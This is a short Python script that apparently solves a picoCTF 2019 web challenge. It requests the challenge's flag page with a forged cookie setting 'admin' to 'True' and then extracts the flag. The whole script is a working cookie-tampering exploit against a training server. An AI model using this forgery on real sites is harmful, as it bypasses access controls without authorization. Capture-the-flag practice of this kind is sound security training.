import requests
from bs4 import BeautifulSoup

cookie={"username": "", "password": "", "admin": "True"}
r = requests.get("https://2019shell1.picoctf.com/problem/32270/flag", cookies=cookie)
soup = BeautifulSoup(r.text, 'html.parser')
flag = soup.code.text
# print(flag)
print(flag[flag.index("{")+1: len(flag)-1])




